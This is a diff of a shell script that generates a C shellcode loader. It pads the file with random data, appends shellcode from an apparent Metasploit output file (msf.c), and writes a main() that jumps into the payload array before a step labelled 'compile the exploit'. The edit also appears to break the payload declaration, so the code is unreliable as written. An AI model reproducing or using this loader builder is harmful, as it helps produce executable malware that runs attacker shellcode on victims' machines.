@@ -56,14 +56,16 @@ cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c$SEED > random
 sed -i 's/$/"/' random
 sed -i 's/^/"/' random
 cat random >> build.c
-echo  ';' >> build.c
-echo 'char payload[] =' >> build.c
+echo ';' >> build.c
+echo 'char payload[] ="";' >> build.c
 cat msf.c |grep -v "unsigned" >> build.c
 echo 'char comment[512] = "";' >> build.c
 echo 'int main(int argc, char **argv) {' >> build.c
-echo  '	(*(void (*)()) payload)();' >> build.c
-echo '	return(0);' >> build.c
+echo ' (*(void (*)()) payload)();' >> build.c
+echo ' return(0);' >> build.c
 echo '}' >> build.c
+
+
 
 # gcc compile the exploit
 
